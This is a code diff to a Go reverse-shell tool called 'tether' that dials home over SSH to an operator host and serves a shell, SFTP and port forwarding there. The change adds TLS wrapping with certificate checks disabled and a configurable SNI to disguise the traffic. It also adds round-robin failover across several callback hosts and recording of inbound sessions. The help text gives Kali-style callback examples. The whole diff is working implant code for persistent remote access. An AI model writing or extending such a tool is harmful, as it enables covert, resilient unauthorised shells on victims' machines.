@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"crypto/tls"
 	"flag"
 	"fmt"
 	"io"
@@ -32,6 +33,8 @@ type params struct {
 	shell        string
 	noShell      bool
 	verbose      bool
+	sessionLog   string
+	useTLS       bool
 }
 
 func createLocalPortForwardingCallback(forbidden bool) ssh.LocalPortForwardingCallback {
@@ -113,12 +116,9 @@ func createSFTPHandler() ssh.SubsystemHandler {
 	}
 }
 
-func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool) (net.Listener, error) {
-	var (
-		err    error
-		client *gossh.Client
-	)
-
+// dialHomeAndListen is a thin composition: dialTarget → optional TLS wrap →
+// gossh.NewClientConn → remote port bind.
+func dialHomeAndListen(username string, address string, homeBindPort uint, askForPassword bool, useTLS bool) (net.Listener, error) {
 	config := &gossh.ClientConfig{
 		User: username,
 		Auth: []gossh.AuthMethod{
@@ -127,25 +127,46 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 		HostKeyCallback: gossh.InsecureIgnoreHostKey(),
 	}
 
-	// Attempt to connect with localPassword initially and keep asking for password on failure
+	var client *gossh.Client
 	for {
-		client, err = gossh.Dial("tcp", address, config)
+		conn, err := dialTarget(address, PROXY)
+		if err != nil {
+			return nil, fmt.Errorf("dial %s: %w", address, err)
+		}
+
+		var netConn net.Conn = conn
+		if useTLS {
+			sni := SNI
+			if sni == "" {
+				host, _, _ := net.SplitHostPort(address)
+				sni = host
+			}
+			tc := tls.Client(conn, &tls.Config{ServerName: sni, InsecureSkipVerify: true})
+			if err := tc.Handshake(); err != nil {
+				conn.Close()
+				return nil, fmt.Errorf("TLS handshake: %w", err)
+			}
+			netConn = tc
+		}
+
+		c, chans, reqs, err := gossh.NewClientConn(netConn, address, config)
 		if err == nil {
+			client = gossh.NewClient(c, chans, reqs)
 			break
-		} else if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
+		}
+		netConn.Close()
+
+		if strings.HasSuffix(err.Error(), "no supported methods remain") && askForPassword {
 			fmt.Println("Enter password:")
 			data, err := term.ReadPassword(int(syscall.Stdin))
 			if err != nil {
 				log.Println(err)
 				continue
 			}
-
-			config.Auth = []gossh.AuthMethod{
-				gossh.Password(string(data)),
-			}
-		} else {
-			return nil, err
+			config.Auth = []gossh.AuthMethod{gossh.Password(string(data))}
+			continue
 		}
+		return nil, err
 	}
 
 	ln, err := client.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", homeBindPort))
@@ -154,11 +175,7 @@ func dialHomeAndListen(username string, address string, homeBindPort uint, askFo
 	}
 	log.Printf("Success: listening at home on %s", ln.Addr().String())
 
-	// Attempt to send extra info back home in the info message of an extra ssh channel
 	sendExtraInfo(client, ln.Addr().String())
-
-	// Detect a dead home connection so run() can reconnect: a failed keepalive
-	// closes the client, which makes ln.Accept (and thus server.Serve) return.
 	go keepAlive(client)
 
 	return ln, nil
@@ -239,7 +256,7 @@ func setupParameters(noCLI string) *params {
 
 	var help = fmt.Sprintf(`tether v%[2]s  Copyright (C) 2026 Darkcast
 
-Usage: %[1]s [options] [[<user>@]<target>]
+Usage: %[1]s [options] [[<user>@]<target>[,<target>...]]
 
 Examples:
   Bind:
@@ -250,6 +267,7 @@ Examples:
 	%[1]s kali@192.168.0.1
 	%[1]s -p 31337 192.168.0.1
 	%[1]s -v -b 0 kali@192.168.0.2
+	%[1]s kali@192.168.0.1,10.0.0.5
 
 Options:
 	-l, Start tether in listening mode (overrides reverse scenario)
@@ -261,12 +279,16 @@ Options:
 		enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
 	-N, Deny all incoming shell/exec/subsystem and local port forwarding requests
 		(if only remote port forwarding is needed, e.g. when catching reverse connections)
+	-L, Directory to record inbound session output into (one file per session)
+	-tls, Wrap the outbound connection in TLS (reverse scenario only)
 	-v, Emit log output
 	-V, Print version and exit
 
 <target>
-	Optional target which enables the reverse scenario. Can be prepended with
-	<user>@ to authenticate as a different user other than '%[8]s' while dialling home
+	Optional target which enables the reverse scenario. Comma-separated list of
+	host[:port] entries tried in round-robin order; all targets are exhausted before
+	exponential backoff is applied. Can be prepended with <user>@ to authenticate
+	as a different user other than '%[8]s' while dialling home
 
 Credentials:
 	Accepting all incoming connections from any user with either of the following:
@@ -294,6 +316,8 @@ Credentials:
 	flag.BoolVar(&p.listen, "l", false, "")
 	flag.StringVar(&p.shell, "s", defaultShell, "")
 	flag.BoolVar(&p.noShell, "N", false, "")
+	flag.StringVar(&p.sessionLog, "L", SESSLOG, "")
+	flag.BoolVar(&p.useTLS, "tls", SNI != "", "")
 	flag.BoolVar(&p.verbose, "v", false, "")
 	var showVersion bool
 	flag.BoolVar(&showVersion, "V", false, "")
@@ -354,10 +378,37 @@ func setupParametersWithoutCLI() *params {
 		shell:        defaultShell,
 		noShell:      false,
 		verbose:      false,
+		sessionLog:   SESSLOG,
+		useTLS:       SNI != "",
 	}
 }
 
+// buildTargets expands a comma-separated host[:port] list into resolved
+// host:port strings, falling back to lport when no port is present.
+func buildTargets(lhost string, lport uint) []string {
+	entries := strings.Split(lhost, ",")
+	out := make([]string, 0, len(entries))
+	portStr := fmt.Sprintf("%d", lport)
+	for _, entry := range entries {
+		entry = strings.TrimSpace(entry)
+		if entry == "" {
+			continue
+		}
+		if _, _, err := net.SplitHostPort(entry); err == nil {
+			out = append(out, entry)
+		} else {
+			out = append(out, net.JoinHostPort(entry, portStr))
+		}
+	}
+	if len(out) == 0 {
+		out = append(out, net.JoinHostPort(lhost, portStr))
+	}
+	return out
+}
+
 func run(p *params, server *ssh.Server) {
+	sessionLogDir = p.sessionLog
+
 	// Shut down cleanly on Ctrl-C / SIGTERM instead of leaving sessions dangling.
 	var shuttingDown atomic.Bool
 	sigs := make(chan os.Signal, 1)
@@ -384,32 +435,42 @@ func run(p *params, server *ssh.Server) {
 		return
 	}
 
-	// Reverse scenario: keep dialling home and reconnect whenever the
-	// connection drops, backing off exponentially between failed attempts.
-	target := net.JoinHostPort(p.LHOST, fmt.Sprintf("%d", p.LPORT))
+	// Reverse scenario: keep dialling home and reconnect whenever the connection
+	// drops, backing off exponentially only after a full round through all targets.
+	targets := buildTargets(p.LHOST, p.LPORT)
 	const (
 		minBackoff = 1 * time.Second
 		maxBackoff = 30 * time.Second
 	)
 	backoff := minBackoff
+	idx := 0
 
 	for !shuttingDown.Load() {
+		target := targets[idx]
+		next := (idx + 1) % len(targets)
+
 		log.Printf("Dialling home via ssh to %s", target)
-		ln, err := dialHomeAndListen(p.LUSER, target, p.homeBindPort, p.verbose)
+		ln, err := dialHomeAndListen(p.LUSER, target, p.homeBindPort, p.verbose, p.useTLS)
 		if err != nil {
 			if shuttingDown.Load() {
 				break
 			}
-			log.Printf("Dial home failed: %v; retrying in %s", err, backoff)
-			time.Sleep(backoff)
-			if backoff *= 2; backoff > maxBackoff {
-				backoff = maxBackoff
+			log.Printf("Dial home failed (%s): %v", target, err)
+			// Apply backoff only after exhausting all targets
+			if next == 0 {
+				log.Printf("All targets failed; retrying in %s", backoff)
+				time.Sleep(backoff)
+				if backoff *= 2; backoff > maxBackoff {
+					backoff = maxBackoff
+				}
 			}
+			idx = next
 			continue
 		}
 
 		// Connected: reset backoff and serve until the home link drops.
 		backoff = minBackoff
+		idx = next
 		err = server.Serve(ln)
 		ln.Close()
 		if shuttingDown.Load() || err == ssh.ErrServerClosed {
